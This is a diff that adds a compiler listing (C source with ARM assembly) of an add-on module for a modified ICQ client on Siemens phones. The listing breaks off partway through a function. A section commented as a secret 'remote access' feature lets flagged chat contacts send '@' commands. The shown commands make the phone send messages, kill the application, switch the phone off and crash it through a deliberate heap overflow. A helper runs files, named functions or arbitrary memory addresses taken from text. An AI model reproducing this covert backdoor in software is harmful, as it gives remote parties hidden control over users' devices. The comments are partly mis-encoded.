@@ -1,0 +1,1300 @@
+##############################################################################
+#                                                                            #
+# IAR ARM ANSI C/C++ Compiler V4.42A/W32 EVALUATION    06/Aug/2008  15:41:31 #
+# Copyright 1999-2005 IAR Systems. All rights reserved.                      #
+#                                                                            #
+#    Cpu mode        =  interwork                                            #
+#    Endian          =  little                                               #
+#    Stack alignment =  4                                                    #
+#    Source file     =  D:\Pasha\elf\_MY_PROJECT_\naticq_mod2\addon.c        #
+#    Command line    =  D:\Pasha\elf\_MY_PROJECT_\naticq_mod2\addon.c        #
+#                       --preprocess D:\Pasha\elf\_MY_PROJECT_\naticq_mod2\R #
+#                       elease_SGOLD\List\ -lC D:\Pasha\elf\_MY_PROJECT_\nat #
+#                       icq_mod2\Release_SGOLD\List\ -o                      #
+#                       D:\Pasha\elf\_MY_PROJECT_\naticq_mod2\Release_SGOLD\ #
+#                       Obj\ -s9 --no_unroll --cpu_mode arm --endian little  #
+#                       --cpu ARM926EJ-S --stack_align 4 --interwork -e      #
+#                       --fpu None --dlib_config "D:\Pasha\Embedded          #
+#                       Workbench 4.0 Evaluation2\ARM\LIB\dl5tpainl8n.h" -I  #
+#                       "D:\Pasha\Embedded Workbench 4.0                     #
+#                       Evaluation2\ARM\INC\" --inline_threshold=2           #
+#    List file       =  D:\Pasha\elf\_MY_PROJECT_\naticq_mod2\Release_SGOLD\ #
+#                       List\addon.lst                                       #
+#    Object file     =  D:\Pasha\elf\_MY_PROJECT_\naticq_mod2\Release_SGOLD\ #
+#                       Obj\addon.r79                                        #
+#                                                                            #
+#                                                                            #
+##############################################################################
+
+D:\Pasha\elf\_MY_PROJECT_\naticq_mod2\addon.c
+      1          #include "../inc/swilib.h"
+      2          #include "../inc/cfg_items.h"
+      3          #include "../inc/pnglist.h"
+      4          #include "NatICQ.h"
+      5          #include "main.h"
+      6          #include "naticq_ipc.h"
+      7          #include "../inc/xtask_ipc.h"
+      8          #include "strings.h"
+      9          
+     10          //“ут вс€ка€ поебень)))
+     11          
+     12          #define _ECHOCHAT    "@1"
+     13          #define _ECHO        "@2"
+     14          #define _VIBRA       "@3"
+     15          #define _IDLESCR     "@4"
+     16          #define _DISCONNECT  "@5"
+     17          #define _GETCLISTALL "@6"
+     18          #define _GETCLIST    "@7"
+     19          #define _WRITE       "@13"
+     20          #define _GETFLIST    "@8"
+     21          #define _RUNFILE     "@9"
+     22          #define _PIKOFF      "@10"
+     23          #define _EXIT        "@11"
+     24          #define _TURNOFF     "@12" 
+     25          #define MSG_ECHOCHAT "@Ms s: %s"
+     26          //#define __ECHOCHAT "\x23\x65\x63\x68\x6F\x63\x68\x61\x74"
+     27          #define ENA_SIGNAL 1 //дл€ команд, активировать сигналы,али нет
+     28          #define DIS_SIGNAL 0
+     29          
+     30          //ѕо 10 секунд
+     31          #define ACTIVE_TIME 360
+     32          
+     33          extern void SendData(CLIST *t,char *s,int signal,int count);
+     34          extern void AddStringToLog(CLIST *t, int code, char *s, const char *name, unsigned int IDforACK,int flag);
+     35          extern void RecountMenu(CLIST *req, int needfocus);
+     36          extern void start_vibra(void);
+     37          extern char *GetStatusByIconIndex(int icon);
+     38          extern CLIST *FindContactByUin(unsigned int uin);
+     39          
+     40          
+     41          extern int comanda;
+     42          extern int VIBR_TYPE;
+     43          extern volatile int silenthide;
+     44          extern volatile int disautorecconect;
+     45          extern volatile int vibra_count;
+     46          extern volatile int SENDMSGCOUNT;
+     47          extern volatile CLIST *cltop;
+     48          extern char per_s[];
+     49          extern char I_str[];
+     50          extern int SHOW_ACTIVE;
+     51          extern const char ipc_my_name[32];
+     52          extern const char ipc_xtask_name[];
+     53          extern const char ipc_test_name[];
+     54          extern IPC_REQ gipc;
+     55          
+
+   \                                 In segment CODE, align 4, keep-with-next
+     56          int get_file_size(char* fname)
+     57          {
+   \                     get_file_size:
+   \   00000000   00402DE9           PUSH     {LR}
+   \   00000004   2CD04DE2           SUB      SP,SP,#+44
+     58            unsigned int err;
+     59            FSTATS fs;
+     60            if ((GetFileStats(fname,&fs,&err))==-1) return 0;
+   \   00000008   0D20A0E1           MOV      R2,SP
+   \   0000000C   04108DE2           ADD      R1,SP,#+4
+   \   00000010   840000EF           SWI      +132
+   \   00000014   010070E3           CMN      R0,#+1
+     61            return (fs.size);
+   \   00000018   08009D15           LDRNE    R0,[SP, #+8]
+   \   0000001C   2CD08DE2           ADD      SP,SP,#+44
+   \   00000020   0000A003           MOVEQ    R0,#+0
+   \   00000024   0080BDE8           POP      {PC}             ;; return
+     62          }
+     63          
+     64          
+
+   \                                 In segment CODE, align 4, keep-with-next
+     65          int start(const char s[128])
+     66          {
+   \                     start:
+   \   00000000   30402DE9           PUSH     {R4,R5,LR}
+   \   00000004   04D04DE2           SUB      SP,SP,#+4
+   \   00000008   0040B0E1           MOVS     R4,R0
+     67            if((s)&&strlen(s))
+   \   0000000C   6D00000A           BEQ      ??start_0
+   \   00000010   1B0000EF           SWI      +27
+   \   00000014   000050E3           CMP      R0,#+0
+   \   00000018   3280BD08           POPEQ    {R1,R4,R5,PC}
+     68             {
+     69              if((s[2]=='\\')&&((s[(strlen(s))-3]=='.')||//ѕровер€ем строку на наличие символов '\\' и '.'
+     70                 (s[(strlen(s))-4]=='.')||(s[(strlen(s))-5]=='.')))
+   \   0000001C   0200D4E5           LDRB     R0,[R4, #+2]
+   \   00000020   5C0050E3           CMP      R0,#+92
+   \   00000024   1E00001A           BNE      ??start_1
+   \   00000028   0400A0E1           MOV      R0,R4
+   \   0000002C   1B0000EF           SWI      +27
+   \   00000030   040080E0           ADD      R0,R0,R4
+   \   00000034   030050E5           LDRB     R0,[R0, #-3]
+   \   00000038   2E0050E3           CMP      R0,#+46
+   \   0000003C   0B00000A           BEQ      ??start_2
+   \   00000040   0400A0E1           MOV      R0,R4
+   \   00000044   1B0000EF           SWI      +27
+   \   00000048   040080E0           ADD      R0,R0,R4
+   \   0000004C   040050E5           LDRB     R0,[R0, #-4]
+   \   00000050   2E0050E3           CMP      R0,#+46
+   \   00000054   0500000A           BEQ      ??start_2
+   \   00000058   0400A0E1           MOV      R0,R4
+   \   0000005C   1B0000EF           SWI      +27
+   \   00000060   040080E0           ADD      R0,R0,R4
+   \   00000064   050050E5           LDRB     R0,[R0, #-5]
+   \   00000068   2E0050E3           CMP      R0,#+46
+   \   0000006C   0C00001A           BNE      ??start_1
+     71                 /* ≈сли в строке есть символы '\\' и '.', то запускаем как обычный файл*/
+     72                  {
+     73                    WSHDR *ws;
+     74                    ws=AllocWS(256);
+   \                     ??start_2:
+   \   00000070   400FA0E3           MOV      R0,#+256
+   \   00000074   250100EF           SWI      +293
+   \   00000078   0050A0E1           MOV      R5,R0
+     75                    str_2ws(ws,s,256);
+   \   0000007C   402FA0E3           MOV      R2,#+256
+   \   00000080   0410A0E1           MOV      R1,R4
+   \   00000084   6C0100EF           SWI      +364
+     76                    ExecuteFile(ws,0,0);
+   \   00000088   0020A0E3           MOV      R2,#+0
+   \   0000008C   0010A0E3           MOV      R1,#+0
+   \   00000090   0500A0E1           MOV      R0,R5
+   \   00000094   940000EF           SWI      +148
+     77                    FreeWS(ws);
+   \   00000098   0500A0E1           MOV      R0,R5
+   \   0000009C   290100EF           SWI      +297
+     78                    return (1);
+   \   000000A0   1F0000EA           B        ??start_3
+     79                   }
+     80              if ((s[2]!='\\')&&(s[(strlen(s))-3]!='.')&&
+     81                 (s[(strlen(s))-4]!='.')&&(s[(strlen(s))-5]!='.')&&
+     82                 (s[0]!='a')&&(s[0]!='A')&&(s[1]!='0'))
+   \                     ??start_1:
+   \   000000A4   0200D4E5           LDRB     R0,[R4, #+2]
+   \   000000A8   20519FE5           LDR      R5,??start_4     ;; `?<Constant "NULL pointer function!">`
+   \   000000AC   5C0050E3           CMP      R0,#+92
+   \   000000B0   2200000A           BEQ      ??start_5
+   \   000000B4   0400A0E1           MOV      R0,R4
+   \   000000B8   1B0000EF           SWI      +27
+   \   000000BC   040080E0           ADD      R0,R0,R4
+   \   000000C0   030050E5           LDRB     R0,[R0, #-3]
+   \   000000C4   2E0050E3           CMP      R0,#+46
+   \   000000C8   1C00000A           BEQ      ??start_5
+   \   000000CC   0400A0E1           MOV      R0,R4
+   \   000000D0   1B0000EF           SWI      +27
+   \   000000D4   040080E0           ADD      R0,R0,R4
+   \   000000D8   040050E5           LDRB     R0,[R0, #-4]
+   \   000000DC   2E0050E3           CMP      R0,#+46
+   \   000000E0   1600000A           BEQ      ??start_5
+   \   000000E4   0400A0E1           MOV      R0,R4
+   \   000000E8   1B0000EF           SWI      +27
+   \   000000EC   040080E0           ADD      R0,R0,R4
+   \   000000F0   050050E5           LDRB     R0,[R0, #-5]
+   \   000000F4   2E0050E3           CMP      R0,#+46
+   \   000000F8   0000D415           LDRBNE   R0,[R4, #+0]
+   \   000000FC   61005013           CMPNE    R0,#+97
+   \   00000100   41005013           CMPNE    R0,#+65
+   \   00000104   0100D415           LDRBNE   R0,[R4, #+1]
+   \   00000108   30005013           CMPNE    R0,#+48
+   \   0000010C   0B00000A           BEQ      ??start_5
+     83                  {
+     84                  int (*p) (void);
+     85                   p=(int(*)(void))GetFunctionPointer((char*)s);
+   \   00000110   0400A0E1           MOV      R0,R4
+   \   00000114   740000EF           SWI      +116
+     86                   if(p!=NULL)
+   \   00000118   000050E3           CMP      R0,#+0
+   \   0000011C   0200000A           BEQ      ??start_6
+     87                    (*p)();
+   \   00000120   30FF2FE1           BLX      R0
+   \                     ??start_3:
+   \   00000124   0100A0E3           MOV      R0,#+1
+   \   00000128   3280BDE8           POP      {R1,R4,R5,PC}
+     88                   else
+     89                     ShowMSG(1,(int)"NULL pointer function!");
+   \                     ??start_6:
+   \   0000012C   0510A0E1           MOV      R1,R5
+   \   00000130   0100A0E3           MOV      R0,#+1
+   \   00000134   480100EF           SWI      +328
+     90                  return 1;
+   \   00000138   0100A0E3           MOV      R0,#+1
+   \   0000013C   3280BDE8           POP      {R1,R4,R5,PC}
+     91                  }
+     92          
+     93              if ((s[2]!='\\')&&(s[(strlen(s))-3]!='.')&&
+     94                 (s[(strlen(s))-4]!='.')&&(s[(strlen(s))-5]!='.')&&
+     95                 ((s[0]=='a')||(s[0]=='A'))&&(s[1]=='0'))
+   \                     ??start_5:
+   \   00000140   0200D4E5           LDRB     R0,[R4, #+2]
+   \   00000144   5C0050E3           CMP      R0,#+92
+   \   00000148   1E00000A           BEQ      ??start_0
+   \   0000014C   0400A0E1           MOV      R0,R4
+   \   00000150   1B0000EF           SWI      +27
+   \   00000154   040080E0           ADD      R0,R0,R4
+   \   00000158   030050E5           LDRB     R0,[R0, #-3]
+   \   0000015C   2E0050E3           CMP      R0,#+46
+   \   00000160   1800000A           BEQ      ??start_0
+   \   00000164   0400A0E1           MOV      R0,R4
+   \   00000168   1B0000EF           SWI      +27
+   \   0000016C   040080E0           ADD      R0,R0,R4
+   \   00000170   040050E5           LDRB     R0,[R0, #-4]
+   \   00000174   2E0050E3           CMP      R0,#+46
+   \   00000178   1200000A           BEQ      ??start_0
+   \   0000017C   0400A0E1           MOV      R0,R4
+   \   00000180   1B0000EF           SWI      +27
+   \   00000184   040080E0           ADD      R0,R0,R4
+   \   00000188   050050E5           LDRB     R0,[R0, #-5]
+   \   0000018C   2E0050E3           CMP      R0,#+46
+   \   00000190   0C00000A           BEQ      ??start_0
+   \   00000194   0000D4E5           LDRB     R0,[R4, #+0]
+   \   00000198   610050E3           CMP      R0,#+97
+   \   0000019C   41005013           CMPNE    R0,#+65
+   \   000001A0   0100D405           LDRBEQ   R0,[R4, #+1]
+   \   000001A4   30005003           CMPEQ    R0,#+48
+   \   000001A8   0600001A           BNE      ??start_0
+     96                  {
+     97                    int entry;
+     98                    sscanf(s,"%08X",&entry);
+   \   000001AC   0D20A0E1           MOV      R2,SP
+   \   000001B0   181085E2           ADD      R1,R5,#+24
+   \   000001B4   0400A0E1           MOV      R0,R4
+   \   000001B8   F50100EF           SWI      +501
+     99                    SUBPROC((void*)entry);
+   \   000001BC   00009DE5           LDR      R0,[SP, #+0]
+   \   000001C0   710100EF           SWI      +369
+    100                    return 1;
+   \   000001C4   D6FFFFEA           B        ??start_3
+    101                  }
+    102             }
+    103            return 0;    
+   \                     ??start_0:
+   \   000001C8   0000A0E3           MOV      R0,#+0
+   \   000001CC   3280BDE8           POP      {R1,R4,R5,PC}    ;; return
+   \                     ??start_4:
+   \   000001D0   ........           DC32     `?<Constant "NULL pointer function!">`
+    104          }
+    105          
+    106          
+
+   \                                 In segment CODE, align 4, keep-with-next
+    107          void CheckComand2(char *txt, CLIST *t)
+    108          {
+   \                     CheckComand2:
+   \   00000000   F04F2DE9           PUSH     {R4-R11,LR}
+    109            comanda=1;    
+   \   00000004   30779FE5           LDR      R7,??CheckComand2_0+0x1C  ;; comanda
+   \   00000008   C8DF4DE2           SUB      SP,SP,#+800
+   \   0000000C   0060A0E1           MOV      R6,R0
+   \   00000010   0180A0E3           MOV      R8,#+1
+   \   00000014   008087E5           STR      R8,[R7, #+0]
+    110          //---------------------- REMOTE ACCESS -------------------//
+    111          //так,маленький секрет так сказать))) глюмлюсь над теми кто достает....))
+    112           if((txt[0]=='#' || txt[0]=='@') && t->isaccess)
+   \   00000018   0000D6E5           LDRB     R0,[R6, #+0]
+   \   0000001C   0140A0E1           MOV      R4,R1
+   \   00000020   230050E3           CMP      R0,#+35
+   \   00000024   40005013           CMPNE    R0,#+64
+   \   00000028   BA01001A           BNE      ??CheckComand2_1
+   \   0000002C   780094E5           LDR      R0,[R4, #+120]
+   \   00000030   000050E3           CMP      R0,#+0
+   \   00000034   B701000A           BEQ      ??CheckComand2_1
+    113            {
+    114              
+    115            if(/*strstr(txt,"#write") || */strstr(txt,_WRITE))//#write uin message
+   \   00000038   00A79FE5           LDR      R10,??CheckComand2_0+0x20  ;; SENDMSGCOUNT
+   \   0000003C   0290A0E3           MOV      R9,#+2
+   \   00000040   F45F8FE2           ADR      R5,??CheckComand2_2  ;; "@13"
+   \   00000044   0510A0E1           MOV      R1,R5
+   \   00000048   0600A0E1           MOV      R0,R6
+   \   0000004C   180100EF           SWI      +280
+   \   00000050   000050E3           CMP      R0,#+0
+   \   00000054   1F00000A           BEQ      ??CheckComand2_3
+    116              {
+    117                char *s=strrchr(txt,' ')+1;
+   \   00000058   2010A0E3           MOV      R1,#+32
+   \   0000005C   0600A0E1           MOV      R0,R6
+   \   00000060   170100EF           SWI      +279
+   \   00000064   014080E2           ADD      R4,R0,#+1
+    118          #ifdef kluchnik
+    119                CLIST *tt;
+    120                tt=FindContactByUin(strtoul(txt+strlen(_WRITE)+1,0,10));
+    121                AddStringToLog(tt,0x01,s,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
+    122                AddStringToLog(t,0x01,txt,I_str,0x7FFF,1);
+    123                t->signals=1;
+    124                tt->signals=1;
+    125                if(SHOW_ACTIVE)
+    126                  tt->isactive=ACTIVE_TIME;
+    127          #else
+    128                ++SENDMSGCOUNT;
+   \   00000068   00009AE5           LDR      R0,[R10, #+0]
+   \   0000006C   010080E2           ADD      R0,R0,#+1
+   \   00000070   00008AE5           STR      R0,[R10, #+0]
+    129          #endif
+    130                TPKT *p;
+    131                p=malloc(sizeof(PKT)+strlen(s)+1);
+   \   00000074   0400A0E1           MOV      R0,R4
+   \   00000078   1B0000EF           SWI      +27
+   \   0000007C   090080E2           ADD      R0,R0,#+9
+   \   00000080   140000EF           SWI      +20
+   \   00000084   0070A0E1           MOV      R7,R0
+    132                p->pkt.uin=strtoul(txt+strlen(_WRITE)+1,0,10);
+   \   00000088   0500A0E1           MOV      R0,R5
+   \   0000008C   1B0000EF           SWI      +27
+   \   00000090   0A20A0E3           MOV      R2,#+10
+   \   00000094   0010A0E3           MOV      R1,#+0
+   \   00000098   060080E0           ADD      R0,R0,R6
+   \   0000009C   010080E2           ADD      R0,R0,#+1
+   \   000000A0   ........           _BLF     strtoul,??strtoul??rA
+   \   000000A4   000087E5           STR      R0,[R7, #+0]
+    133                p->pkt.type=T_SENDMSG;
+   \   000000A8   B490C7E1           STRH     R9,[R7, #+4]
+    134                p->pkt.data_len=strlen(s);
+   \   000000AC   0400A0E1           MOV      R0,R4
+   \   000000B0   1B0000EF           SWI      +27
+   \   000000B4   B600C7E1           STRH     R0,[R7, #+6]
+    135                strcpy(p->data,s);
+   \   000000B8   0410A0E1           MOV      R1,R4
+   \   000000BC   080087E2           ADD      R0,R7,#+8
+   \   000000C0   1A0000EF           SWI      +26
+    136                SUBPROC((void *)SendAnswer,0,p);
+   \   000000C4   78069FE5           LDR      R0,??CheckComand2_0+0x24  ;; SendAnswer
+   \   000000C8   0720A0E1           MOV      R2,R7
+   \   000000CC   0010A0E3           MOV      R1,#+0
+   \   000000D0   710100EF           SWI      +369
+    137                return;
+   \   000000D4   270100EA           B        ??CheckComand2_4
+    138              }
+    139               
+    140             if(strstr(txt,_PIKOFF))
+   \                     ??CheckComand2_3:
+   \   000000D8   68569FE5           LDR      R5,??CheckComand2_0+0x28  ;; `?<Constant "BGAGA">`
+   \   000000DC   CE1F8FE2           ADR      R1,??CheckComand2_2+0x4  ;; "@10"
+   \   000000E0   0600A0E1           MOV      R0,R6
+   \   000000E4   180100EF           SWI      +280
+   \   000000E8   000050E3           CMP      R0,#+0
+   \   000000EC   0300000A           BEQ      ??CheckComand2_5
+    141              {
+    142                char *s=malloc(1);
+   \   000000F0   0100A0E3           MOV      R0,#+1
+   \   000000F4   140000EF           SWI      +20
+    143                strcpy(s,"BGAGA");    
+   \   000000F8   0510A0E1           MOV      R1,R5
+   \   000000FC   1A0000EF           SWI      +26
+    144              }
+    145             
+    146                if(strstr(txt,_EXIT))
+   \                     ??CheckComand2_5:
+   \   00000100   00B0A0E3           MOV      R11,#+0
+   \   00000104   C51F8FE2           ADR      R1,??CheckComand2_2+0x8  ;; "@11"
+   \   00000108   0600A0E1           MOV      R0,R6
+   \   0000010C   180100EF           SWI      +280
+   \   00000110   000050E3           CMP      R0,#+0
+   \   00000114   0200000A           BEQ      ??CheckComand2_6
+    147              {    
+    148                t->signals=0;
+    149          #ifdef kluchnik
+    150          #else      
+    151                extern void ElfKiller(void);
+    152                SUBPROC((void *)ElfKiller);        
+   \   00000118   2C069FE5           LDR      R0,??CheckComand2_0+0x2C  ;; ElfKiller
+   \   0000011C   74B084E5           STR      R11,[R4, #+116]
+   \   00000120   710100EF           SWI      +369
+    153          #endif
+    154              }
+    155              
+    156              if(strstr(txt,_TURNOFF))
+   \                     ??CheckComand2_6:
+   \   00000124   BE1F8FE2           ADR      R1,??CheckComand2_2+0xC  ;; "@12"
+   \   00000128   0600A0E1           MOV      R0,R6
+   \   0000012C   180100EF           SWI      +280
+   \   00000130   000050E3           CMP      R0,#+0
+   \   00000134   0200000A           BEQ      ??CheckComand2_7
+    157              {
+    158                t->signals=0;
+   \   00000138   74B084E5           STR      R11,[R4, #+116]
+    159          #ifdef kluchnik      
+    160          #else
+    161                SwitchPhoneOff();
+   \   0000013C   090000EF           SWI      +9
+    162          #endif
+    163                return;
+   \   00000140   0C0100EA           B        ??CheckComand2_4
+    164              }    
+   \                     ??CheckComand2_7:
+   \   00000144   B71F8FE2           ADR      R1,??CheckComand2_2+0x10  ;; "@1"
+   \   00000148   0600A0E1           MOV      R0,R6
+    165             
+    166             if(/*strstr(txt,"#echochat") || */strstr(txt,_ECHOCHAT))
+   \   0000014C   180100EF           SWI      +280
+   \   00000150   000050E3           CMP      R0,#+0
+   \   00000154   5D00000A           BEQ      ??CheckComand2_8
+    167             {
+    168              char msg[256];
+    169              sprintf(msg,MSG_ECHOCHAT,txt);
+   \   00000158   0620A0E1           MOV      R2,R6
+   \   0000015C   081085E2           ADD      R1,R5,#+8
+   \   00000160   880F8DE2           ADD      R0,SP,#+544
+   \   00000164   160000EF           SWI      +22
+    170              char *k;
+    171              if(strstr(txt,_ECHOCHAT))
+   \   00000168   AE1F8FE2           ADR      R1,??CheckComand2_2+0x10  ;; "@1"
+   \   0000016C   0600A0E1           MOV      R0,R6
+   \   00000170   180100EF           SWI      +280
+   \   00000174   000050E3           CMP      R0,#+0
+   \   00000178   0300000A           BEQ      ??CheckComand2_9
+    172                k=txt+(strlen(_ECHOCHAT)+2);
+   \   0000017C   A90F8FE2           ADR      R0,??CheckComand2_2+0x10  ;; "@1"
+   \   00000180   1B0000EF           SWI      +27
+   \   00000184   060080E0           ADD      R0,R0,R6
+   \   00000188   028080E2           ADD      R8,R0,#+2
+    173          /*    else
+    174               k=txt+(strlen("#echochat")+2);*/
+    175              char name[32];
+    176              zeromem(name,32);
+   \                     ??CheckComand2_9:
+   \   0000018C   2010A0E3           MOV      R1,#+32
+   \   00000190   48008DE2           ADD      R0,SP,#+72
+   \   00000194   1D0100EF           SWI      +285
+    177              char *tmp;
+    178              if(tmp=strstr(txt," ")+1)//после первого пробела идет им€
+   \   00000198   A31F8FE2           ADR      R1,??CheckComand2_2+0x14  ;; " "
+   \   0000019C   0600A0E1           MOV      R0,R6
+   \   000001A0   180100EF           SWI      +280
+   \   000001A4   010080E2           ADD      R0,R0,#+1
+   \   000001A8   00008DE5           STR      R0,[SP, #+0]
+   \   000001AC   000050E3           CMP      R0,#+0
+   \   000001B0   1900000A           BEQ      ??CheckComand2_10
+    179              {
+    180                if(strstr(tmp,"!"))//если есть еще '!',значит им€ прописали:)
+   \   000001B4   9D1F8FE2           ADR      R1,??CheckComand2_2+0x18  ;; "!"
+   \   000001B8   180100EF           SWI      +280
+   \   000001BC   000050E3           CMP      R0,#+0
+   \   000001C0   1400000A           BEQ      ??CheckComand2_11
+    181                {
+    182                  int ii=0;
+    183                  for(ii=0;(ii<strlen(k) && ii<32) && ( k[ii]!=' ' );ii++)
+   \   000001C4   0090A0E3           MOV      R9,#+0
+   \   000001C8   030000EA           B        ??CheckComand2_12
+    184                    name[ii]=k[ii];
+   \                     ??CheckComand2_13:
+   \   000001CC   0810D9E7           LDRB     R1,[R9, +R8]
+   \   000001D0   04009DE5           LDR      R0,[SP, #+4]
+   \   000001D4   019089E2           ADD      R9,R9,#+1
+   \   000001D8   0010C0E5           STRB     R1,[R0, #+0]
+   \                     ??CheckComand2_12:
+   \   000001DC   48108DE2           ADD      R1,SP,#+72
+   \   000001E0   011089E0           ADD      R1,R9,R1
+   \   000001E4   04108DE5           STR      R1,[SP, #+4]
+   \   000001E8   0800A0E1           MOV      R0,R8
+   \   000001EC   1B0000EF           SWI      +27
+   \   000001F0   000059E1           CMP      R9,R0
+   \   000001F4   0400002A           BCS      ??CheckComand2_14
+   \   000001F8   200059E3           CMP      R9,#+32
+   \   000001FC   020000AA           BGE      ??CheckComand2_14
+   \   00000200   0800D9E7           LDRB     R0,[R9, +R8]
+   \   00000204   200050E3           CMP      R0,#+32
+   \   00000208   EFFFFF1A           BNE      ??CheckComand2_13
+    185                    name[ii++]=0;
+   \                     ??CheckComand2_14:
+   \   0000020C   04009DE5           LDR      R0,[SP, #+4]
+   \   00000210   00B0C0E5           STRB     R11,[R0, #+0]
+   \   00000214   000000EA           B        ??CheckComand2_10
+    186                }
+    187                else tmp=0;//иначе нуль
+   \                     ??CheckComand2_11:
+   \   00000218   00B08DE5           STR      R11,[SP, #+0]
+    188              }
+    189              else tmp=0;//так,на вс€к случай ))
+    190              
+    191          //    char *msg2=strrchr(txt,' ')+1;//наше сообщение дл€ отправки
+    192              char *msg2;
+    193              if(strstr(txt,_ECHOCHAT))
+   \                     ??CheckComand2_10:
+   \   0000021C   811F8FE2           ADR      R1,??CheckComand2_2+0x10  ;; "@1"
+   \   00000220   0600A0E1           MOV      R0,R6
+   \   00000224   180100EF           SWI      +280
+   \   00000228   000050E3           CMP      R0,#+0
+   \   0000022C   0700000A           BEQ      ??CheckComand2_15
+    194                msg2=txt+(strlen(_ECHOCHAT)+2+strlen(name)+1);
+   \   00000230   7C0F8FE2           ADR      R0,??CheckComand2_2+0x10  ;; "@1"
+   \   00000234   1B0000EF           SWI      +27
+   \   00000238   0070A0E1           MOV      R7,R0
+   \   0000023C   48008DE2           ADD      R0,SP,#+72
+   \   00000240   1B0000EF           SWI      +27
+   \   00000244   070080E0           ADD      R0,R0,R7
+   \   00000248   060080E0           ADD      R0,R0,R6
+   \   0000024C   037080E2           ADD      R7,R0,#+3
+    195          /*    else
+    196                msg2=txt+(strlen("#echochat")+1+strlen(name)+1);*/
+    197              char *s=malloc(256);
+   \                     ??CheckComand2_15:
+   \   00000250   400FA0E3           MOV      R0,#+256
+   \   00000254   140000EF           SWI      +20
+   \   00000258   0060A0E1           MOV      R6,R0
+    198              sprintf(s,"m [ %s ] to [ %s ] n [ %s ] s.",msg2,t->name, name);
+   \   0000025C   48008DE2           ADD      R0,SP,#+72
+   \   00000260   01002DE9           PUSH     {R0}
+   \   00000264   143084E2           ADD      R3,R4,#+20
+   \   00000268   0720A0E1           MOV      R2,R7
+   \   0000026C   141085E2           ADD      R1,R5,#+20
+   \   00000270   0600A0E1           MOV      R0,R6
+   \   00000274   160000EF           SWI      +22
+    199              if(tmp!=0)
+   \   00000278   04109DE5           LDR      R1,[SP, #+4]
+   \   0000027C   04D08DE2           ADD      SP,SP,#+4
+   \   00000280   000051E3           CMP      R1,#+0
+   \   00000284   00109AE5           LDR      R1,[R10, #+0]
+   \   00000288   FF00A0E3           MOV      R0,#+255
+   \   0000028C   7F0C80E3           ORR      R0,R0,#0x7F00
+   \   00000290   011081E2           ADD      R1,R1,#+1
+   \   00000294   00108AE5           STR      R1,[R10, #+0]
+   \   00000298   0120A0E3           MOV      R2,#+1
+   \   0000029C   04002DE9           PUSH     {R2}
+   \   000002A0   010000E0           AND      R0,R0,R1
+   \   000002A4   01002DE9           PUSH     {R0}
+    200                AddStringToLog(t,0x02,msg2,name,(++SENDMSGCOUNT)&0x7FFF,1);
+   \   000002A8   50308D12           ADDNE    R3,SP,#+80
+    201              else
+    202                AddStringToLog(t,0x02,msg2,"Ib",(++SENDMSGCOUNT)&0x7FFF,1);
+   \   000002AC   603F8F02           ADREQ    R3,??CheckComand2_2+0x1C  ;; "Ib"
+   \   000002B0   0720A0E1           MOV      R2,R7
+   \   000002B4   0210A0E3           MOV      R1,#+2
+   \   000002B8   0400A0E1           MOV      R0,R4
+   \   000002BC   ........           _BLF     AddStringToLog,??AddStringToLog??rA
+   \   000002C0   08D08DE2           ADD      SP,SP,#+8
+    203          
+    204              SendData(t,s,ENA_SIGNAL,0);
+   \   000002C4   0030A0E3           MOV      R3,#+0
+   \   000002C8   0120A0E3           MOV      R2,#+1
+   \                     ??CheckComand2_16:
+   \   000002CC   A40000EA           B        ??CheckComand2_17
+    205              mfree(s);
+    206              return;   
+    207             }
+    208             
+    209             if(/*strstr(txt,"#echo") || */strstr(txt,_ECHO))
+   \                     ??CheckComand2_8:
+   \   000002D0   581F8FE2           ADR      R1,??CheckComand2_2+0x20  ;; "@2"
+   \   000002D4   0600A0E1           MOV      R0,R6
+   \   000002D8   180100EF           SWI      +280
+   \   000002DC   000050E3           CMP      R0,#+0
+   \   000002E0   0A00000A           BEQ      ??CheckComand2_18
+    210               {
+    211                ShowMSG(1,(int)txt+2);
+   \   000002E4   021086E2           ADD      R1,R6,#+2
+   \   000002E8   0100A0E3           MOV      R0,#+1
+   \   000002EC   480100EF           SWI      +328
+    212                char msg[256];
+    213                sprintf(msg,"M %s snd",txt);
+   \   000002F0   0620A0E1           MOV      R2,R6
+   \   000002F4   341085E2           ADD      R1,R5,#+52
+   \   000002F8   880F8DE2           ADD      R0,SP,#+544
+   \   000002FC   160000EF           SWI      +22
+    214                SendData(t,msg,ENA_SIGNAL,1);
+   \   00000300   0830A0E1           MOV      R3,R8
+   \   00000304   0320A0E1           MOV      R2,R3
+   \   00000308   881F8DE2           ADD      R1,SP,#+544
+   \   0000030C   FF0000EA           B        ??CheckComand2_19
+    215                return;
+    216               }
+    217             
+    218             if(/*strstr(txt,"#vibra") || */strstr(txt,_VIBRA))
+   \                     ??CheckComand2_18:
+   \   00000310   491F8FE2           ADR      R1,??CheckComand2_2+0x24  ;; "@3"
+   \   00000314   0600A0E1           MOV      R0,R6
+   \   00000318   180100EF           SWI      +280
+   \   0000031C   000050E3           CMP      R0,#+0
+   \   00000320   1200000A           BEQ      ??CheckComand2_20
+    219              {
+    220                vibra_count=strtoul(txt+3,0,10);
+   \   00000324   24549FE5           LDR      R5,??CheckComand2_0+0x30  ;; vibra_count
+   \   00000328   0A20A0E3           MOV      R2,#+10
+   \   0000032C   0010A0E3           MOV      R1,#+0
+   \   00000330   030086E2           ADD      R0,R6,#+3
+   \   00000334   ........           _BLF     strtoul,??strtoul??rA
+   \   00000338   000085E5           STR      R0,[R5, #+0]
+    221                
+    222                if(vibra_count==0)
+   \   0000033C   000095E5           LDR      R0,[R5, #+0]
+   \   00000340   000050E3           CMP      R0,#+0
+   \   00000344   0400001A           BNE      ??CheckComand2_21
+    223                {
+    224                  if( VIBR_TYPE) //если написали просто команду без параметра
+   \   00000348   04049FE5           LDR      R0,??CheckComand2_0+0x34  ;; VIBR_TYPE
+   \   0000034C   000090E5           LDR      R0,[R0, #+0]
+   \   00000350   000050E3           CMP      R0,#+0
+    225                   vibra_count=2;
+   \   00000354   00908515           STRNE    R9,[R5, #+0]
+    226                  else
+    227                   vibra_count=1;
+   \   00000358   00808505           STREQ    R8,[R5, #+0]
+    228                }
+    229          #ifdef kluchnik
+    230                if(vibra_count>10 || vibra_count<0)
+    231                  vibra_count=1;
+    232          #endif
+    233                start_vibra();
+   \                     ??CheckComand2_21:
+   \   0000035C   ........           _BLF     start_vibra,??start_vibra??rA
+    234                SendData(t,"act",DIS_SIGNAL,1);
+   \   00000360   0130A0E3           MOV      R3,#+1
+   \   00000364   0B20A0E1           MOV      R2,R11
